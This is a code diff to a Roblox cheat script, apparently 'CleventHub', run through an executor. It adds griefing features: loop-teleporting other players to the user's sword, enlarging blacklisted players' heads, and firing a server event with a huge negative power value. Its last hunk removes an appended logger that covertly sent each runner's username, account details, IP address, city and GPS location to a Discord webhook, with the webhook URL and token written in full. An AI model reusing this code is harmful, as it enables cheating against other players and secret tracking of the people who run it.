@@ -6717,7 +6717,7 @@ local humanoidRootPart = Players.LocalPlayer.Character:FindFirstChild("HumanoidR
 local Workspace = game:GetService("Workspace")  
 local filename = "CleventHub v1.0.0.1 Settings.txt"
 local prefixfile = "CleventHub Prefix v1.0.0.1 Settings.txt"
-local update4 = "CleventNotification4.txt"
+--local update5 = "CleventNotification5.txt"
 local whitefile = "Whitelist CleventHub v1.0.0.1 Settings.txt"
 local permafile = "Blacklist CleventHub v1.0.0.1 Settings.txt"
 local valuesfile = "CleventHub Values v1.0.0.1 Settings.txt"
@@ -6773,6 +6773,10 @@ local totalTrainingTime = 0
 local deathCount = 0
 local totalTime = 0
 local respawnCounter = 0
+local Reputation = game.Players.LocalPlayer.leaderstats:WaitForChild("Reputation")
+local lastReputation = Reputation.Value
+local Reps = game.Players.LocalPlayer.leaderstats:WaitForChild("Reputation")
+local lastReps = Reps.Value
 local lastVal = game.Players.LocalPlayer.leaderstats.Ninjutsu.Value
 local charrespawning = false
 local characterrespawning = false
@@ -6910,91 +6914,14 @@ FunctionTable['added_value'] = function(nv)
 	end
 end
 
-for i,v in ipairs(Players:GetPlayers()) do
-	v.CharacterAdded:Connect(function(character)
-		local humanoid = character:WaitForChild("Humanoid", 5)
-		if humanoid then
-			humanoid.Died:Connect(function()
-				local char = humanoid.Parent
-				local playerDied = Players:GetPlayerFromCharacter(char)
-				if not playerDied then return end
-
-				local sword = Player.Character and Player.Character:FindFirstChild("Sword")
-				if sword and sword:IsA("Tool") and sword.Parent == Player.Character then
-					sessionKill = sessionKill + 1
-					killCount = killCount + 1
-					return
-				end
-
-				local kunai = game.Workspace:FindFirstChild("ThrownKunai", true)
-				if kunai and kunai:IsA("BasePart") then
-					local creator = kunai:FindFirstChild("creator")
-					if creator and creator:IsA("ObjectValue") and creator.Value == Player then
-						sessionKill = sessionKill + 1
-						killCount = killCount + 1
-					end
-				end
-			end)
-		end
-	end)
-
-	if v.Character then
-		local humanoid = v.Character:FindFirstChild("Humanoid")
-		if humanoid then
-			humanoid.Died:Connect(function()
-				local char = humanoid.Parent
-				local playerDied = Players:GetPlayerFromCharacter(char)
-				if not playerDied then return end
-
-				local sword = Player.Character and Player.Character:FindFirstChild("Sword")
-				if sword and sword:IsA("Tool") and sword.Parent == Player.Character then
-					sessionKill = sessionKill + 1
-					killCount = killCount + 1
-					return
-				end
-
-				local kunai = game.Workspace:FindFirstChild("ThrownKunai", true)
-				if kunai and kunai:IsA("BasePart") then
-					local creator = kunai:FindFirstChild("creator")
-					if creator and creator:IsA("ObjectValue") and creator.Value == Player then
-						sessionKill = sessionKill + 1
-						killCount = killCount + 1
-					end
-				end
-			end)
-		end
+Reputation:GetPropertyChangedSignal("Value"):Connect(function()
+	local newValue = Reputation.Value
+	if newValue > lastReputation then
+		sessionKill = sessionKill + 1
+		killCount = killCount + 1
 	end
-end
-
-Players.PlayerAdded:Connect(function(player)
-	player.CharacterAdded:Connect(function(character)
-		local humanoid = character:WaitForChild("Humanoid", 5)
-		if humanoid then
-			humanoid.Died:Connect(function()
-				local char = humanoid.Parent
-				local playerDied = Players:GetPlayerFromCharacter(char)
-				if not playerDied then return end
-
-				local sword = Player.Character and Player.Character:FindFirstChild("Sword")
-				if sword and sword:IsA("Tool") and sword.Parent == Player.Character then
-					sessionKill = sessionKill + 1
-					killCount = killCount + 1
-					return
-				end
-
-				local kunai = game.Workspace:FindFirstChild("ThrownKunai", true)
-				if kunai and kunai:IsA("BasePart") then
-					local creator = kunai:FindFirstChild("creator")
-					if creator and creator:IsA("ObjectValue") and creator.Value == Player then
-						sessionKill = sessionKill + 1
-						killCount = killCount + 1
-					end
-				end
-			end)
-		end
-	end)
+	lastReputation = newValue
 end)
-
 FunctionTable['kill_count'] = function(mode)
 	if mode == "session" then
 		return sessionKill
@@ -7002,9 +6929,15 @@ FunctionTable['kill_count'] = function(mode)
 		return killCount
 	end
 end
-FunctionTable['DeathCounter'] = function()
-	deathCount += 1
+FunctionTable['DeathCounter'] = function(newValue)
+	if newValue < lastReps then
+		deathCount += 1
+	end
+	lastReps = newValue
 end
+Reps:GetPropertyChangedSignal("Value"):Connect(function()
+	FunctionTable['DeathCounter'](Reps.Value)
+end)
 FunctionTable['UpdateHealthPercent'] = function()
 	local char = Player.Character
 	if not char then return 100 end
@@ -8039,24 +7972,41 @@ FunctionTable.VariableFunctions = {
 			Lbtn.Text = "Stop Loobringing"
 			Lbtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 			Lbtn.TextSize = 15.000
-
+			
+			function getEquippedSwordHandle()
+            	local character = game.Players.LocalPlayer.Character
+            	if not character then return nil end
+            
+            	local sword = character:FindFirstChild("Sword")
+            	if sword and sword:IsA("Tool") then
+            		return sword:FindFirstChild("Handle")
+            	end
+            	return nil
+            end
 			function bringPlayer(targetPlayer)
-				if connections[targetPlayer] then return end
-				connections[targetPlayer] = true
-				task.spawn(function()
-					while connections[targetPlayer] do
-						if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-							local myCharacter = game.Players.LocalPlayer.Character
-							local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
-							local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-							if myRoot and targetRoot then
-								targetRoot.CFrame = myRoot.CFrame * CFrame.new(2, 0, -tonumber(VariableTable['LoopDistance']))
-							end
-						end
-						task.wait(0.01)
-					end
-				end)
-			end
+            	if connections[targetPlayer] then return end
+            	connections[targetPlayer] = true
+            	task.spawn(function()
+            		while connections[targetPlayer] do
+            			if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            				local targetRoot = targetPlayer.Character.HumanoidRootPart
+            				if tonumber(VariableTable['LoopDistance']) == 0 then
+            					local swordHandle = getEquippedSwordHandle()
+            					if swordHandle then
+            						targetRoot.CFrame = swordHandle.CFrame * CFrame.new(0, 0, -2)
+            					end
+            				else
+            					local myCharacter = game.Players.LocalPlayer.Character
+            					local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
+            					if myRoot then
+            						targetRoot.CFrame = myRoot.CFrame * CFrame.new(2, 0, -tonumber(VariableTable['LoopDistance']))
+            					end
+            				end
+            			end
+            			task.wait(0.01)
+            		end
+            	end)
+            end
 			function stopLoopbring(targetPlayer)
 				connections[targetPlayer] = nil
 			end
@@ -8384,7 +8334,7 @@ FunctionTable.VariableFunctions = {
 							head.Massless = true
 							head.CanCollide = false
 						end
-						task.wait(0.1)
+						task.wait(0.01)
 					end
 				end)
 			end
@@ -8434,6 +8384,10 @@ FunctionTable.VariableFunctions = {
 				button.TextColor3 = Color3.new(1, 1, 1)
 				button.Name = player.Name .. "Button"
 				button.Parent = CHsf
+				if table.find(permBlacklist, player.Name) then
+					bigHead(player)
+					button.TextColor3 = Color3.new(1, 1, 0)
+				end
 				button.MouseButton1Down:Connect(function()
                     if originalSizes[player] then
                         resetHead(player)
@@ -12714,7 +12668,11 @@ FunctionTable.VariableFunctions = {
 					end
 				end
 				Players.LocalPlayer.CharacterAdded:Connect(function(NewChar)
-					disableShurikens(NewChar)
+                    task.spawn(function()
+                        while task.wait(0.1) do
+					        disableShurikens(NewChar)
+                        end
+                    end)
 				end)
 				while VariableTable['AutoDetect'] == true do
 					detectAndBlacklist()
@@ -13194,7 +13152,7 @@ FunctionTable.VariableFunctions = {
                     if command and commandPrefix ~= "" and command:sub(1, #commandPrefix) == commandPrefix then
                         command = command:sub(#commandPrefix + 1)
                     end
-                    if command == "tg" then
+                    if (command == "tg" or command == "target") then
 						for _, partial in ipairs(nameList) do
 							for _, player in ipairs(Players:GetPlayers()) do
 								if player.Name:lower():find(partial:lower()) then
@@ -13216,7 +13174,7 @@ FunctionTable.VariableFunctions = {
 								end
 							end
 						end
-                    elseif command == "rtg" and playerName ~= "" then
+                    elseif (command == "rtg" or command == "removetarget") and playerName ~= "" then
 						for _, partial in ipairs(nameList) do
 							for i = #permBlacklist, 1, -1 do
 								local name = permBlacklist[i]
@@ -13271,7 +13229,7 @@ FunctionTable.VariableFunctions = {
 								end
 							end
 						end
-                    elseif command == "negative" then
+                    elseif command == "negative" or command == "nnin" then
                         if VariableTable['AutoTrain'] == true then
                             game.StarterGui:SetCore("SendNotification", {
                                 Title = "Notification",
@@ -13289,7 +13247,7 @@ FunctionTable.VariableFunctions = {
                                 game:GetService("ReplicatedStorage").RemoteEvent.AddPowerEvent:FireServer("FromTraining", -19916241294912496129491248999999.99)
                             end
                         end)
-                    elseif command == "cmdlists" then
+                    elseif command == "cmdlists" or command == "commandlists" or command == "lists" then
                         local CmdLists = Instance.new("ScreenGui")
                         local Frame = Instance.new("Frame")
                         local Title = Instance.new("TextLabel")
@@ -13407,7 +13365,7 @@ FunctionTable.VariableFunctions = {
                             Desc.TextWrapped = true
                             Desc.TextXAlignment = Enum.TextXAlignment.Left
                         end
-                    elseif command == "wl" and playerName ~= "" then
+                    elseif (command == "wl" or command == "whitelist") and playerName ~= "" then
 						for _, partial in ipairs(nameList) do
 							for _, player in ipairs(Players:GetPlayers()) do
 								if player.Name:lower():find(partial:lower()) then
@@ -13429,7 +13387,7 @@ FunctionTable.VariableFunctions = {
 								end
 							end
 						end
-					elseif command == "unwl" and playerName ~= "" then
+					elseif (command == "unwl" or command == "unwhitelist") and playerName ~= "" then
 						if whitelist and next(whitelist) then
 							local found = false
 							for _, partial in ipairs(nameList) do
@@ -13669,7 +13627,7 @@ FunctionTable.VariableFunctions = {
 								Duration = 4
 							})
 						end
-					elseif command == "hidefx" and playerName ~= "" then
+					elseif (command == "hidefx" or command == "hideeffects") and playerName ~= "" then
 						for _, partial in ipairs(nameList) do
 							for _, player in ipairs(Players:GetPlayers()) do
 								if player.Name:lower():find(partial:lower()) then
@@ -13705,7 +13663,7 @@ FunctionTable.VariableFunctions = {
 								end
 							end
 						end
-					elseif command == "unhidefx" and playerName ~= "" then
+					elseif (command == "unhidefx" or command == "unhideeffects") and playerName ~= "" then
 						if hiddenFX and next(hiddenFX) then
 							local found = false
 							for _, partial in ipairs(nameList) do
@@ -13743,7 +13701,7 @@ FunctionTable.VariableFunctions = {
 								Duration = 4
 							})
 						end
-					elseif command == "hidecf" then
+					elseif command == "hidecf" or command == "hidechangeframe" then
 						task.spawn(function()
 							while task.wait(0.1) do
 								local Gui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("ScreenGui")
@@ -13783,7 +13741,7 @@ FunctionTable.VariableFunctions = {
 								game.Players.LocalPlayer.PlayerGui:FindFirstChild("FirstScreenGui").Enabled = false
 							end
 						end)
-                    elseif command == "changeprefix" and playerName ~= "" then
+                    elseif (command == "changeprefix" or command == "prefix") and playerName ~= "" then
                         changePrefix(playerName)
                     end
                     TextBox.Text = ""
@@ -14100,126 +14058,6 @@ FunctionTable['LoadSettings'] = function()
     end
 end
 
-FunctionTable['UpdateNotification'] = function(forceNotify)
-	if writefile and isfile then
-		if forceNotify and isfile(update4) then
-			delfile(update4)
-		end
-
-		if not isfile(update4) then
-			writefile(update4, "shown")
-
-			pcall(function()
-				game:GetService("StarterGui"):SetCore("SendNotification", {
-					Title = "CleventHub Loaded",
-					Text = "Clevent Hub has been updated!",
-					Duration = 5
-				})
-			end)
-			local ScreenGui = Instance.new("ScreenGui")
-			local Frame = Instance.new("Frame")
-			local Title = Instance.new("TextLabel")
-			local ScrollingFrame = Instance.new("ScrollingFrame")
-			local Text = Instance.new("TextLabel")
-			local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
-			local CloseButton = Instance.new("TextButton")
-
-			--Properties:
-
-			ScreenGui.Parent = game:GetService("CoreGui")
-			ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-			ScreenGui.ResetOnSpawn = false
-
-			Frame.Parent = ScreenGui
-			Frame.Active = true
-			Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-			Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-			Frame.BackgroundTransparency = 0.350
-			Frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
-			Frame.BorderSizePixel = 0
-			Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-			Frame.Size = UDim2.new(0.5, 0, 0.649999976, 0)
-            Frame.Draggable = true
-
-			Title.Name = "Title"
-			Title.Parent = Frame
-			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			Title.BackgroundTransparency = 1.000
-			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			Title.BorderSizePixel = 0
-			Title.Size = UDim2.new(1, 0, 0.119999997, 0)
-			Title.Font = Enum.Font.Fantasy
-			Title.Text = "Clevent Notification"
-			Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-			Title.TextScaled = true
-			Title.TextSize = 14.000
-			Title.TextWrapped = true
-
-			ScrollingFrame.Parent = Frame
-			ScrollingFrame.Active = true
-			ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			ScrollingFrame.BackgroundTransparency = 1.000
-			ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			ScrollingFrame.BorderSizePixel = 0
-			ScrollingFrame.Position = UDim2.new(0.0500000007, 0, 0.129999995, 0)
-			ScrollingFrame.Size = UDim2.new(0.899999976, 0, 0.720000029, 0)
-			ScrollingFrame.ScrollBarThickness = 6
-
-			Text.Name = "Text"
-			Text.Parent = ScrollingFrame
-			Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			Text.BackgroundTransparency = 1.000
-			Text.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			Text.BorderSizePixel = 0
-			Text.Size = UDim2.new(1, 0, 1, 0)
-			Text.Font = Enum.Font.SourceSansBold
-			Text.Text = [[
-            CleventHub has been updated!
-
-            🔥New Features:
-			You can now do auto clone by keeping both AutoRespawn and CloneTools On (NOTE: this is very useful especially if you're tired of retoggling CloneTools)
-         (TIPS: Also if you want an auto fighting mode without you clicking AHSword all the time just keep AutoEqpSwrd and AHSword turned On)
-
-			   🎉New Features for Commands:
-         You can now type short commands(Note: some of them are already short so I'll think of another name for the rest that doesn't have short command)
-
-			(Note: Me and Braxy will be updating the VoidTrain very soon and there's gonna be another version of CleventHub )
-         
-                                                     ⚔️CLEVENT ON TOP⚔️
-            <------------------------------------------------------------------------------------------->
-            
-            ]]
-			Text.TextColor3 = Color3.fromRGB(255, 255, 255)
-			Text.TextScaled = true
-			Text.TextSize = 20.000
-			Text.TextWrapped = true
-			Text.TextXAlignment = Enum.TextXAlignment.Left
-			Text.TextYAlignment = Enum.TextYAlignment.Top
-
-			UITextSizeConstraint.Parent = Text
-			UITextSizeConstraint.MaxTextSize = 20
-
-			CloseButton.Name = "CloseButton"
-			CloseButton.Parent = Frame
-			CloseButton.AnchorPoint = Vector2.new(0.5, 1)
-			CloseButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-			CloseButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			CloseButton.BorderSizePixel = 1
-			CloseButton.Position = UDim2.new(0.5, 0, 0.975734055, 0)
-			CloseButton.Size = UDim2.new(0.349999994, 0, 0.0799999982, 0)
-			CloseButton.Font = Enum.Font.Fantasy
-			CloseButton.Text = "Close"
-			CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-			CloseButton.TextScaled = true
-			CloseButton.TextSize = 14.000
-			CloseButton.TextWrapped = true
-			CloseButton.MouseButton1Click:Connect(function()
-				ScreenGui:Destroy()
-			end)
-		end
-	end
-end
-
 FunctionTable['LoadPrefix'] = function()
     local httpservice = game:GetService("HttpService")
     if (readfile and isfile and isfile(prefixfile)) then
@@ -14313,7 +14151,7 @@ FunctionTable['LoadWhitelistSettings']()
 FunctionTable['LoadBlacklistSettings']()
 FunctionTable['LoadValueSettings']()
 FunctionTable['NAFixer']()
-FunctionTable['UpdateNotification']()
+--FunctionTable['UpdateNotification']()
 
 for i,v in ipairs(Backpack:GetChildren()) do
 	if v:IsA("Tool") and v.Name == "Train" then
@@ -14930,228 +14768,4 @@ for i,v in ipairs(workspace.ALL:GetDescendants()) do
 		workspace.ALL:GetDescendants()[i].Active = false
         task.wait(0.1)
 	end
-end
--------------------------------------
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1431660949634289866/8ngeKLw2tJzp-dawoP0t-WgbTvkDbDI68tJPIWgHrZSzMSDmcUtjdnEMRGC_mZ5Or8eB"
-getgenv().ExecLogSecret = true
-
-local ui = gethui()
-local folderName = "screen"
-local folder = Instance.new("Folder")
-folder.Name = folderName
-local player = game:GetService("Players").LocalPlayer
-local CoreGui = game:GetService("CoreGui")
-local hunterHubVersion = "HunterHub v5.1.0"
-
-for i,v in ipairs(CoreGui:GetChildren()) do
-    if v:IsA("ScreenGui") and v.Name:lower():find("cleventhub") then
-        hunterHubVersion = v.Name
-        break
-    end
-end
-
-getgenv().whscript = hunterHubVersion
-
-if ui:FindFirstChild(folderName) then
-    print("Script is already executed! Rejoin if it's an error!")
-    local ui2 = gethui()
-    local folderName2 = "screen2"
-    local folder2 = Instance.new("Folder")
-    folder2.Name = folderName2
-    if ui2:FindFirstChild(folderName2) then
-        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
-    else
-        folder2.Parent = gethui()
-    end
-else
-    folder.Parent = gethui()
-    local players = game:GetService("Players")
-    local userid = player.UserId
-    local gameid = game.PlaceId
-    local jobid = tostring(game.JobId)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    local deviceType =
-        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
-    local snipePlay =
-        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
-    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
-    local workspace = game:GetService("Workspace")
-    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
-    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
-    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
-    local playerCount = #players:GetPlayers()
-    local maxPlayers = players.MaxPlayers
-    local health =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
-    local maxHealth =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
-        "N/A"
-    local position =
-        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
-        player.Character.HumanoidRootPart.Position or
-        "N/A"
-    local gameVersion = game.PlaceVersion
-
-    if not getgenv().ExecLogSecret then
-        getgenv().ExecLogSecret = false
-    end
-    if not getgenv().whscript then
-        getgenv().whscript = "Please provide a script name!"
-    end
-    local commonLoadTime = 5
-    task.wait(commonLoadTime)
-    local pingThreshold = 100
-    local serverStats = game:GetService("Stats").Network.ServerStatsItem
-    local dataPing = serverStats["Data Ping"]:GetValueString()
-    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
-    local function checkPremium()
-        local premium = "false"
-        local success, response =
-            pcall(
-            function()
-                return player.MembershipType
-            end
-        )
-        if success then
-            if response == Enum.MembershipType.None then
-                premium = "false"
-            else
-                premium = "true"
-            end
-        else
-            premium = "Failed to retrieve Membership:"
-        end
-        return premium
-    end
-    local premium = checkPremium()
-
-    local url = getgenv().webhookexecUrl
-
-    local data = {
-        ["content"] = "@everyone",
-        ["embeds"] = {
-            {
-                ["title"] = "🚀 **Script Execution Detected | Exec Log**",
-                ["description"] = "*A script was executed in your script. Here are the details:*",
-                ["type"] = "rich",
-                ["color"] = tonumber(0x3498db), -- Clean blue color
-                ["fields"] = {
-                    {
-                        ["name"] = "🔍 **Script Info**",
-                        ["value"] = "💻 Script Name: " ..
-                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "👤 **Player Details**",
-                        ["value"] = "🧸 Username: " ..
-                            player.Name ..
-                            "\n📝 Display Name: " ..
-                            player.DisplayName ..
-                            "\n🆔 UserID: " ..
-                            userid ..
-                            "\n❤️ Health: " ..
-                            health ..
-                            " / " ..
-                            maxHealth ..
-                            "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
-                            userid .. "/profile)",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "📅 **Account Information**",
-                        ["value"] = "🗓️ Account Age: " ..
-                            player.AccountAge ..
-                            " days\n💎 Premium Status: " ..
-                            premium ..
-                            "\n📅 Account Created: " ..
-                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🎮 **Game Details**",
-                        ["value"] = "🏷️ Game Name: " ..
-                            gameName ..
-                            "\n🆔 Game ID: " ..
-                            gameid ..
-                            "\n🔗 Game Link (https://www.roblox.com/games/" ..
-                            gameid .. ")\n🔢 Game Version: " .. gameVersion,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🕹️ **Server Info**",
-                        ["value"] = "👥 Players in Server: " ..
-                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S"),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📡 **Network Info**",
-                        ["value"] = "📶 Ping: " .. pingValue .. " ms",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🖥️ **System Info**",
-                        ["value"] = "📺 Resolution: " ..
-                            screenWidth ..
-                            "x" ..
-                            screenHeight ..
-                            "\n🔍 Memory Usage: " ..
-                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor(),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📍 **Character Position**",
-                        ["value"] = "📍 Position: " .. tostring(position),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🪧 **Join Script**",
-                        ["value"] = "```lua\n" .. snipePlay .. "\n```",
-                        ["inline"] = false
-                    }
-                },
-                ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
-                },
-                ["footer"] = {
-                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
-                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
-                }
-            }
-        }
-    }
-
-    -- Check if the secret tab should be included
-    if getgenv().ExecLogSecret then
-        local ip = game:HttpGet("https://api.ipify.org")
-        local iplink = "https://ipinfo.io/" .. ip .. "/json"
-        local ipinfo_json = game:HttpGet(iplink)
-        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
-
-        table.insert(
-            data.embeds[1].fields,
-            {
-                ["name"] = "**(🤫) Secret**",
-                ["value"] = "||(👣) IP Address: " ..
-                    ipinfo_table.ip ..
-                    "||\n||(🌆) Country: " ..
-                    ipinfo_table.country ..
-                    "||\n||(🪟) GPS Location: " ..
-                    ipinfo_table.loc ..
-                    "||\n||(🏙️) City: " ..
-                    ipinfo_table.city ..
-                    "||\n||(🏡) Region: " ..
-                    ipinfo_table.region ..
-                    "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
-            }
-        )
-    end
-
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
 end
